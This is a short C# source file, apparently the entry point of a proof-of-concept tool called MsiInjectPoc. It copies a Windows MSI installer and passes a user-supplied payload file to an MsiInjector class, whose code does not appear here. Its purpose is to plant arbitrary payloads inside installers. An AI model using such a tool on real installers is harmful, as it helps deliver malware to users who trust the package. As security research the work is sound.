using System;
using System.IO;

namespace MsiInjectPoc
{
	internal class Program
	{
		static void Main(string[] args)
		{
			if (args.Length != 2)
			{
				Console.WriteLine("Usage: MsiInjectPoc.exe <path to MSI to patch> <path to payload>");
				return;
			}

			string patchedFileName = args[0].Replace(".msi", "_patched.msi");
			if (File.Exists(patchedFileName))
			{
				File.Delete(patchedFileName);
			}

			File.Copy(args[0], patchedFileName);

			using (MsiInjector injector = new MsiInjector(patchedFileName))
			{
				injector.SetInjection(File.ReadAllBytes(args[1]));
			}
		}
	}
}